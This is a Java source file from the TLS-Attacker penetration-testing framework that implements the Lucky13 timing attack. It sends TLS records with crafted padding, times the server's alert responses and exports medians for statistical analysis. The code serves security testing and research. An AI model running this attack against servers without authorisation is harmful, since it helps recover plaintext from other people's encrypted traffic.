/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import java.io.FileWriter;
import java.io.IOException;
import java.util.Collections;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import de.rub.nds.tlsattacker.attacks.config.Lucky13CommandConfig;
import de.rub.nds.modifiablevariable.VariableModification;
import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.core.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ApplicationMessage;
import de.rub.nds.tlsattacker.core.record.Record;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.modifiablevariable.util.ArrayConverter;

/**
 * Executes the Lucky13 attack test
 *
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(Lucky13Attacker.class);

    private final Map<Integer, List<Long>> results;

    private long lastResult;

    public Lucky13Attacker(Lucky13CommandConfig config) {
        super(config, false);
        results = new HashMap<>();
    }

    @Override
    public void executeAttack() {
        String[] paddingStrings = config.getPaddings().split(",");
        int[] paddings = new int[paddingStrings.length];
        for (int i = 0; i < paddingStrings.length; i++) {
            paddings[i] = Integer.parseInt(paddingStrings[i]);
        }
        for (int i = 0; i < config.getMeasurements(); i++) {
            LOGGER.info("Starting round {}", i);
            for (int p : paddings) {
                Record record = createRecordWithPadding(p);
                executeAttackRound(record);
                if (results.get(p) == null) {
                    results.put(p, new LinkedList<Long>());
                }
                // removeTlsAction the first 20% of measurements
                if (i > config.getMeasurements() / 5) {
                    results.get(p).add(lastResult);
                }
            }
        }

        StringBuilder medians = new StringBuilder();
        for (int padding : paddings) {
            List<Long> rp = results.get(padding);
            Collections.sort(rp);
            LOGGER.info("Padding: {}", padding);
            long median = rp.get(rp.size() / 2);
            LOGGER.info("Median: {}", median);
            medians.append(median).append(",");
        }
        LOGGER.info("Medians: {}", medians);

        if (config.getMonaFile() != null) {
            StringBuilder commands = new StringBuilder();
            for (int i = 0; i < paddings.length - 1; i++) {
                for (int j = i + 1; j < paddings.length; j++) {
                    String fileName = config.getMonaFile() + "-" + paddings[i] + "-" + paddings[j];
                    String[] delimiters = { (";" + paddings[i] + ";"), (";" + paddings[j] + ";") };
                    createMonaFile(fileName, delimiters, results.get(paddings[i]), results.get(paddings[j]));
                    String command = "java -jar ReportingTool.jar --inputFile=" + fileName + " --name=lucky13-"
                            + paddings[i] + "-" + paddings[j] + " --lowerBound=0.3 --upperBound=0.5";
                    LOGGER.info("Run mona timing lib with: " + command);
                    commands.append(command);
                    commands.append(System.getProperty("line.separator"));
                }
            }
            LOGGER.info("All commands at once: \n{}", commands);
        }
    }

    private void createMonaFile(String fileName, String[] delimiters, List<Long> result1, List<Long> result2) {
        try (FileWriter fw = new FileWriter(fileName)) {
            for (int i = 0; i < result1.size(); i++) {
                fw.write(Integer.toString(i * 2));
                fw.write(delimiters[0] + result1.get(i) + System.getProperty("line.separator"));
                fw.write(Integer.toString(i * 2 + 1));
                fw.write(delimiters[1] + result2.get(i) + System.getProperty("line.separator"));
            }
        } catch (IOException ex) {
            LOGGER.debug(ex);
        }
    }

    public void executeAttackRound(Record record) {
        Config tlsConfig = config.createConfig();
        TlsContext tlsContext = new TlsContext(tlsConfig);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getExecutorType(),
                tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();
        // Client
        ApplicationMessage applicationMessage = new ApplicationMessage(tlsConfig);
        SendAction action = new SendAction(applicationMessage);
        trace.addTlsAction(action);
        action.getConfiguredRecords().add(record);
        // Server
        AlertMessage alertMessage = new AlertMessage(tlsConfig);
        trace.addTlsAction(new ReceiveAction(alertMessage));
        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info("Not possible to finalize the defined workflow.");
            LOGGER.debug(ex);
        }
        lastResult = tlsContext.getTransportHandler().getLastMeasurement();

    }

    private Record createRecordWithPadding(int p) {
        byte[] padding = createPaddingBytes(p);
        int recordLength = config.getBlockSize() * config.getBlocks();
        if (recordLength < padding.length) {
            throw new ConfigurationException("Padding too large");
        }
        int messageSize = recordLength - padding.length;
        byte[] message = new byte[messageSize];
        byte[] plain = ArrayConverter.concatenate(message, padding);
        return createRecordWithPlainData(plain);
    }

    private Record createRecordWithPlainData(byte[] plain) {
        Record r = new Record();
        ModifiableByteArray plainData = new ModifiableByteArray();
        VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
        plainData.setModification(modifier);
        r.setPlainRecordBytes(plainData);
        return r;
    }

    private byte[] createPaddingBytes(int padding) {
        byte[] paddingBytes = new byte[padding + 1];
        for (int i = 0; i < paddingBytes.length; i++) {
            paddingBytes[i] = (byte) padding;
        }
        return paddingBytes;
    }

    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not supported yet."); // To
    }

}
